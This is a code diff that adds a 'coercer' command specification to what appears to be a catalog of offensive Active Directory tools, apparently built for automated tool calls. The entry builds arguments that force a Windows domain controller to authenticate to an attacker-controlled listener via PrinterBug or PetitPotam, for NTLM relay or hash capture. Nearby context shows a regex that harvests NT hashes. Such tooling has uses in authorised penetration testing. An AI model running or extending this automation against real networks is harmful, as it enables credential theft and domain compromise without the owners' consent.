@@ -535,6 +535,24 @@ CATALOG: list[CommandSpec] = [
         harvest=[HarvestRule("nthash", r"Got hash for '[^']+':\s*[a-f0-9]{32}:([a-f0-9]{32})")],
         aliases=["certipy"], install_hint="pipx install certipy-ad.",
     ),
+    CommandSpec(
+        name="coercer",
+        description="Coerce a Windows host (DC/server) into authenticating to an "
+                    "attacker-controlled listener over MS-RPRN (PrinterBug), MS-EFSR "
+                    "(PetitPotam), MS-DFSNM, etc. This is the trigger for an NTLM relay "
+                    "or a NetNTLM capture. Needs a domain credential and a listener IP "
+                    "(your host). Pair with a running ntlmrelayx / responder.",
+        binary="coercer", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "listener": {"type": "string", "description": "Attacker IP the target should authenticate to."}},
+            ["target", "listener"]),
+        build_args=lambda k: ["coerce", "-t", _s(k["target"]), "-l", _s(k["listener"])]
+                             + (["-u", _s(k["username"]), "-p", _s(k.get("password", "")),
+                                 "-d", _s(k.get("domain", ""))] if k.get("username") else [])
+                             + ["-v"],
+        harvest=[HarvestRule("coerced", r"\[\+\].*(?:got|authentication|responded|success)", scope="host")],
+        timeout=300, install_hint="pipx install coercer.",
+    ),
 
     # ---- Credentials -----------------------------------------------------
     CommandSpec(
